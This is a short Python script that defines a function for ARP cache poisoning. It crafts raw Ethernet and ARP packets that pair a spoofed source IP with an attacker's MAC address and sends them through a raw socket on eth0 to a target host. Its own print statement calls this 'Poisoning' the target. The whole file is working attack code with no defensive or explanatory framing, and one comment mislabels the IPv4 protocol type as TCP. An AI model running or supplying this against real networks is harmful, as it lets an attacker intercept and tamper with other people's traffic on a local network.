import struct
import socket
import binascii

def sendSpoofedArp(ip_src, mac_src, ip_target, mac_target):
	
	print(f"Poisoning {ip_target} {mac_target} with spoofed {ip_src} with attacker MAC {mac_src}")

	rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,
							socket.htons(0x0003))
	rawSocket.bind(("eth0", socket.htons(0x0003)))

	mac_src = binascii.unhexlify(mac_src.replace(':', '').upper())
	mac_target = binascii.unhexlify(mac_target.replace(':', '').upper())

	# Ethernet Header
	protocol = 0x0806  # ARP
	eth_hdr = struct.pack("!6s6sH", mac_target, mac_src, protocol)

	# ARP header
	htype = 1  # Hardware_type ethernet
	ptype = 0x0800  # Protocol type TCP
	hlen = 6  # Hardware address Len
	plen = 4  # Protocol addr. len
	operation = 1  # 1=request/2=reply
	src_ip = socket.inet_aton(ip_src)
	dst_ip = socket.inet_aton(ip_target)
	arp_hdr = struct.pack("!HHBBH6s4s6s4s", htype, ptype, hlen, plen, operation,
						mac_src, src_ip, mac_target, dst_ip)

	packet = eth_hdr + arp_hdr
	rawSocket.send(packet)